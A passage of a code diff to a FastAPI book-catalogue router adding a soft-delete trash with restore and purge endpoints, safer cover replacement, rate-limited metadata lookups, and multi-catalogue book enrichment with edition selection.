+    for extension in ("jpg", "jpeg", "png", "webp"):
+        path = COVERS_DIR / f"{book.id}.{extension}"
+        if path.exists():
+            path.unlink()
+    db.delete(book)
+
+
+@router.get("/trash", response_model=Page[BookOut])
+def list_trash(
+    db: DbSession,
+    current_user: CurrentUser,
+    paging: Paging,
+) -> Page[BookOut]:
+    """What this member has deleted and could still put back.
+
+    Declared before `/{book_id}`, like `/export`: FastAPI matches in
+    declaration order, so the reverse would make this a request for the book
+    with id "trash".
+
+    Most recently deleted first. The trash is read to find something just lost,
+    not to browse a history.
+    """
+    query = db.query(Book).filter(in_trash_for(current_user.id))
+    total = query.with_entities(func.count(Book.id)).order_by(None).scalar() or 0
+
+    books = (
+        query.options(joinedload(Book.added_by), selectinload(Book.tags))
+        .order_by(Book.deleted_at.desc(), Book.id.desc())
+        .offset(paging.offset)
+        .limit(paging.limit)
+        .all()
+    )
+    return Page[BookOut](
+        items=books_to_out(books, current_user, db),
+        total=total,
+        page=paging.page,
+        page_size=paging.page_size,
+    )
+
+
+@router.delete("/trash", response_model=PurgeResult)
+def empty_trash(db: DbSession, current_user: CurrentUser) -> PurgeResult:
+    """Delete everything in the caller's trash for good.
+
+    Scoped by `in_trash_for`, so emptying the trash never reaches a book the
+    caller could not see in it. There is no automatic expiry: this app has no
+    scheduler, and a sweep at startup would delete on restart timing rather
+    than on any schedule anybody chose.
+    """
+    books = db.query(Book).filter(in_trash_for(current_user.id)).all()
+    for book in books:
+        _purge(book, db)
+    db.commit()
+    return PurgeResult(purged=len(books))
+
+
 # ── Single book ───────────────────────────────────────────────────────────────
 
 
 @router.get("/{book_id}", response_model=BookOut)
 def get_book(book: BookForRead, db: DbSession, current_user: CurrentUser) -> BookOut:
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 @router.patch("/{book_id}/privacy", response_model=BookOut)
@@ -1031,12 +1247,43 @@ def set_privacy(
     book.is_private = payload.is_private
     db.commit()
     db.refresh(book)
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 @router.delete("/{book_id}", status_code=status.HTTP_204_NO_CONTENT)
 def delete_book(book: BookForWrite, db: DbSession) -> None:
-    db.delete(book)
+    """Move a book to the trash. Reversible with `POST /{id}/restore`.
+
+    The row stays and `deleted_at` is stamped. A delete is one tap away from
+    every book, it is the only action here that repeating does not undo, and a
+    catalogue is somebody's hours of typing. Reviews of the competition make
+    the same complaint about all of them: the app does not say what was
+    deleted and offers no way to put it back.
+
+    The status code is unchanged at 204, so nothing calling this has to know.
+    """
+    _trash(book, db)
+    db.commit()
+
+
+@router.post("/{book_id}/restore", response_model=BookOut)
+def restore_book(book: BookInTrash, db: DbSession, current_user: CurrentUser) -> BookOut:
+    """Put a trashed book back on the shelf.
+
+    Everything comes back with it: tags, notes, loans and every member's
+    reading status, because none of it ever left. That is the difference
+    between this and re-adding the book by hand, and it is the whole point.
+    """
+    book.deleted_at = None
+    db.commit()
+    db.refresh(book)
+    return book_to_out(book, current_user, db)
+
+
+@router.delete("/{book_id}/permanent", status_code=status.HTTP_204_NO_CONTENT)
+def purge_book(book: BookInTrash, db: DbSession) -> None:
+    """Delete one trashed book for good."""
+    _purge(book, db)
     db.commit()
 
 
@@ -1061,7 +1308,7 @@ def update_status(
     _stamp_reading_dates(user_book, payload.status)
     user_book.status = payload.status
     db.commit()
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 def _stamp_reading_dates(user_book: UserBook, new_status: ReadStatus) -> None:
@@ -1114,7 +1361,7 @@ def add_book_tag(
         book.tags.append(tag)
         db.commit()
         db.refresh(book)
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 @router.delete("/{book_id}/tags/{tag_id}", response_model=BookOut)
@@ -1129,7 +1376,7 @@ def remove_book_tag(
         book.tags.remove(tag)
         db.commit()
         db.refresh(book)
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 # ── Cover upload ──────────────────────────────────────────────────────────────
@@ -1145,18 +1392,14 @@ async def upload_cover(
     # The extension comes from the file's magic bytes, never from its name.
     data, extension = await read_image_upload(file)
 
-    # Remove any previous cover in another format, or both would exist and
-    # which one won would depend on lookup order.
-    for old_extension in ("jpg", "jpeg", "png", "webp"):
-        old_path = COVERS_DIR / f"{book.id}.{old_extension}"
-        if old_path.exists():
-            old_path.unlink()
-
-    (COVERS_DIR / f"{book.id}.{extension}").write_bytes(data)
+    # Written into place, then the other formats of the same book removed. The
+    # old order deleted first, so a failed write left the book with no cover at
+    # all. See uploads.replace_image.
+    replace_image(COVERS_DIR, str(book.id), extension, data)
     book.cover_url = f"/covers/{book.id}.{extension}"
     db.commit()
     db.refresh(book)
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 # ── Metadata refresh ──────────────────────────────────────────────────────────
@@ -1167,12 +1410,14 @@ async def refresh_metadata(book: BookForWrite, db: DbSession, current_user: Curr
     if not book.isbn:
         raise HTTPException(status_code=400, detail="Book has no ISBN, cannot refresh metadata")
 
+    metadata_limiter.check(current_user.username)
     lookup_key = isbn_utils.parse(book.isbn) or book.isbn
-    data = await _fetch_open_library(lookup_key)
-    if not data:
-        data = await _fetch_google_books(lookup_key)
-    if not data:
-        raise HTTPException(status_code=404, detail="No metadata found for this ISBN")
+    result = await metadata.lookup(lookup_key, settings_store.google_books_api_key(db))
+    if not result.found:
+        raise HTTPException(**_lookup_failure(result))
+
+    assert result.data is not None
+    data = result.data
 
     book.title = data["title"] or book.title
     book.subtitle = data.get("subtitle")
@@ -1181,13 +1426,18 @@ async def refresh_metadata(book: BookForWrite, db: DbSession, current_user: Curr
     book.year = data.get("year")
     book.description = data.get("description")
 
+    # Only ever filled in, never cleared: a refresh whose source lacks the page
+    # count should not delete the one already on the record.
+    book.language = data.get("language") or book.language
+    book.page_count = data.get("page_count") or book.page_count
+
     # A cover the member uploaded outranks whatever the source offers.
     if not (book.cover_url and book.cover_url.startswith("/covers/")):
         book.cover_url = data.get("cover_url")
 
     db.commit()
     db.refresh(book)
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 # ── Notes ─────────────────────────────────────────────────────────────────────
@@ -1262,30 +1512,6 @@ def delete_note(
 # ── Enrichment ────────────────────────────────────────────────────────────────
 
 
-def _require_google_books(db: Session) -> str:
-    """The configured API key, or a 400 explaining what to turn on.
-
-    Both the toggle and the key are admin settings, so the message names which
-    one is missing rather than reporting a generic failure to a member who
-    cannot fix either.
-    """
-    if not settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED):
-        raise HTTPException(
-            status_code=400,
-            detail="Google Books lookup is switched off. An admin can enable it in Settings.",
-        )
-
-    # The resolved key: the environment's if the deployment supplied one, else
-    # the stored one. Reading the setting directly here would ignore an
-    # environment key and refuse a lookup that would have worked.
-    api_key = settings_store.google_books_api_key(db)
-    if not api_key:
-        raise HTTPException(
-            status_code=400,
-            detail="No Google Books API key is set. An admin can add one in Settings.",
-        )
-    return api_key
-
 
 @router.post("/{book_id}/enrich", response_model=BookEnrichmentOut)
 async def enrich_book(
@@ -1294,30 +1520,46 @@ async def enrich_book(
     current_user: CurrentUser,
     overwrite: Annotated[bool, Query(description="Replace fields that already have a value")] = False,
 ) -> BookEnrichmentOut:
-    """Fill in the fields Open Library usually lacks, from Google Books.
+    """Fill in the fields a book is missing, from every catalogue available.
 
-    Matched by ISBN when there is one, otherwise by title and author. Only
-    empty fields are filled unless `overwrite` is set: enrichment adds what is
-    missing, it does not overrule what somebody typed.
+    Matched by ISBN when there is one, which runs the full merged chain (the
+    DNB and K10plus together, then Open Library, then Google), and by title and
+    author otherwise, which runs the ranked search across all six sources.
+
+    **No API key is required.** This was Google-only and refused outright
+    without a key, which made it useless for exactly the books the German and
+    French catalogues were added for: a 978-3 ISBN that Google does not carry
+    would report "no key" rather than the full record the DNB was holding.
+
+    Only empty fields are filled unless `overwrite` is set: enrichment adds
+    what is missing, it does not overrule what somebody typed.
     """
-    api_key = _require_google_books(db)
+    metadata_limiter.check(current_user.username)
+    # Present is better than absent, but never required. When a key is
+    # configured Google joins the chain as its last source; when it is not,
+    # everything else still answers.
+    api_key = (
+        settings_store.google_books_api_key(db)
+        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
+        else ""
+    )
 
-    try:
-        fields = None
-        if book.isbn:
-            fields = await google_books.lookup_by_isbn(book.isbn, api_key)
+    fields: dict[str, Any] | None = None
+    if book.isbn:
+        result = await metadata.lookup(book.isbn, api_key)
+        if result.found:
+            fields = _enrichment_fields(result.data or {})
 
-        if fields is None:
-            # No ISBN, or Google does not carry this edition under it.
-            query = " ".join(part for part in (book.title, book.author) if part)
-            matches = await google_books.search(query, api_key, limit=1)
-            fields = matches[0] if matches else None
-    except google_books.GoogleBooksError as error:
-        raise HTTPException(status_code=502, detail=str(error)) from error
+    if fields is None:
+        # No ISBN, or no catalogue carries this edition under it.
+        query = " ".join(part for part in (book.title, book.author) if part)
+        matches = await metadata.search(query, api_key, limit=1)
+        if matches:
+            fields = dict(matches[0])
 
     if fields is None:
         return BookEnrichmentOut(
-            book=_book_to_out(book, current_user, db), updated_fields=[], found=False
+            book=book_to_out(book, current_user, db), updated_fields=[], found=False
         )
 
     updated = google_books.merge_into(book, fields, overwrite=overwrite)
@@ -1326,30 +1568,83 @@ async def enrich_book(
         db.refresh(book)
 
     return BookEnrichmentOut(
-        book=_book_to_out(book, current_user, db), updated_fields=updated, found=True
+        book=book_to_out(book, current_user, db), updated_fields=updated, found=True
     )
 
 
-@router.get("/{book_id}/enrich/candidates", response_model=list[GoogleBooksMatch])
+def _enrichment_fields(record: dict[str, Any]) -> dict[str, Any]:
+    """A lookup record in the shape `google_books.merge_into` writes from.
+
+    Two differences and no more: the merger reads `categories` as the joined
+    string a book row stores, where a lookup carries a list of subject
+    headings, and it has no use for the ISBN it was already given.
+    """
+    fields = dict(record)
+    subjects = fields.pop("subjects", None)
+    if subjects:
+        fields["categories"] = google_books.join_categories(subjects)
+    return fields
+
+
+@router.post("/{book_id}/enrich/apply", response_model=BookEnrichmentOut)
+def apply_enrichment(
+    payload: BookMatch,
+    book: BookForWrite,
+    db: DbSession,
+    current_user: CurrentUser,
+    overwrite: Annotated[bool, Query(description="Replace fields that already have a value")] = False,
+) -> BookEnrichmentOut:
+    """Fill this book in from an edition the member picked.
+
+    Separate from `POST /enrich`, which chooses for them. This exists because
+    choosing automatically is wrong often enough to matter: a paperback and its
+    hardback are different page counts and different covers, and a search will
+    happily return the wrong printing of the right book. Nothing is written
+    until somebody has looked at the candidates and said which one it is.
+
+    The merge rule is the same either way, and it is the server's rather than
+    the client's: only empty fields are filled unless `overwrite` is set, so a
+    publisher somebody typed in by hand is never quietly replaced.
+    """
+    updated = google_books.merge_into(
+        book,
+        payload.model_dump(exclude={"source", "suggested_tag_ids"}),
+        overwrite=overwrite,
+    )
+    if updated:
+        db.commit()
+        db.refresh(book)
+
+    return BookEnrichmentOut(
+        book=book_to_out(book, current_user, db), updated_fields=updated, found=True
+    )
+
+
+@router.get("/{book_id}/enrich/candidates", response_model=list[BookMatch])
 async def enrichment_candidates(
     book: BookForRead,
     db: DbSession,
     current_user: CurrentUser,
-) -> list[GoogleBooksMatch]:
-    """Editions Google offers for this book, so the right one can be chosen.
+) -> list[BookMatch]:
+    """Other editions of this book, so the right one can be chosen.
 
     Useful when the automatic match picks a different printing: the page count
-    and cover of a paperback and its hardback are not the same.
+    and cover of a paperback and its hardback are not the same. Searched across
+    every catalogue, and ranked, so a German edition of a German book is not
+    buried under whatever Google happened to return first.
     """
-    api_key = _require_google_books(db)
+    metadata_limiter.check(current_user.username)
+    api_key = (
+        settings_store.google_books_api_key(db)
+        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
+        else ""
+    )
     query = " ".join(part for part in (book.title, book.author) if part)
 
-    try:
-        matches = await google_books.search(query, api_key, limit=5)
-    except google_books.GoogleBooksError as error:
-        raise HTTPException(status_code=502, detail=str(error)) from error
-
-    return [GoogleBooksMatch(**match) for match in matches]
+    matches = await metadata.search(
+        query, api_key, limit=5, prefer_language=book.language
+    )
+    return [BookMatch(**match) for match in matches]
 
 
 @router.patch("/{book_id}/ownership", response_model=BookOut)
@@ -1362,7 +1657,7 @@ def set_ownership(
     book.ownership = payload.ownership
     db.commit()
     db.refresh(book)
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 @router.patch("/{book_id}/rating", response_model=BookOut)
@@ -1390,7 +1685,7 @@ def set_rating(
 
     user_book.rating = payload.rating
     db.commit()
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
 
 
 @router.patch("/{book_id}", response_model=BookOut)
@@ -1411,4 +1706,4 @@ def update_book_details(
 
     db.commit()
     db.refresh(book)
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
